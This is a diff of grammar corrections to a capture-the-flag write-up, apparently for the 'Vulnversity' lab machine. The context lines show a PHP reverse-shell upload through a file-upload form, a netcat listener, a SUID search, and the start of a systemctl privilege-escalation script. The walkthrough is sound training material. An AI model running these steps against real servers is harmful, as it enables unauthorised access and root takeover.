@@ -46,7 +46,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 97.26 seconds
 ```
 
-We see an Apache webserver running on port 3333. Let's fire up our browser and see what we have there.
+We see an Apache Web Server running on port 3333. Let's fire up our browser and see what we have there.
 
 <center><br>
 <img src="/assets/img/uploads/vulnversity/port3333.png">
@@ -77,7 +77,7 @@ Starting gobuster
 /internal (Status: 301)
 ```
 
-We find some directories. Opening the '/internal/' directory, provides us with the some upload functionality!
+We found some directories. Opening the '/internal/' directory, provides us with some upload functionality!
 
 <center><br>
 <img src="/assets/img/uploads/vulnversity/internal.png">
@@ -105,7 +105,7 @@ As we can see .phtml returns 'Success'. This is the extension we will be using w
 <img src="/assets/img/uploads/vulnversity/attack.png">
 </center>
 
-I will we using the webshell from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> pentest monkey,</a> you can use any shell you like, change the IP and port in the shell and upload it to the server. After uploading, we can find it at /internal/uploads/.
+I will use the webshell from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> pentest monkey,</a> you can use any shell you like, change the IP and port in the shell and upload it to the server. After uploading, we can find it at /internal/uploads/.
 
 ```r
 m1m3@kali:~$ nc -lvnp 9001
@@ -121,7 +121,7 @@ $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@vulnuniversity:/$ 
 ```
 
-An we managed to get into the server. Now we can read the user.txt!
+And we managed to get into the server. Now we can read the user.txt!
 
 ```r
 www-data@vulnuniversity:/$ cd /home/bill
@@ -133,7 +133,7 @@ www-data@vulnuniversity:/home/bill$
 ```
 
 ### Privilege Escalation
-This task is a little bit challenging. For this we need to exploit the SUID bits. Let's first look for SUID bit set.
+This task is a little bit challenging. For this we need to exploit the SUID bits. Let's first look for the SUID bit set.
 
 ```r
 www-data@vulnuniversity:/bin$ find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v proc
@@ -149,7 +149,7 @@ www-data@vulnuniversity:/bin$ find / -user root -perm -4000 -exec ls -ldb {} \; 
 ...
 ```
 
-Looking at the output of the command, we can see that systemctl had a suid bit active. Searching on the <a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFO Bins,</a> I found that we can exploit systemctl for privilege escalation. Copy and execute the following script into /bin directory.
+Looking at the output of the command, we can see that systemctl had a suid bit active. Searching on the <a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFO Bins,</a> I found that we can exploit systemctl for privilege escalation. Copy and execute the following script into the /bin directory.
 
 ```sh
 TF=$(mktemp).service
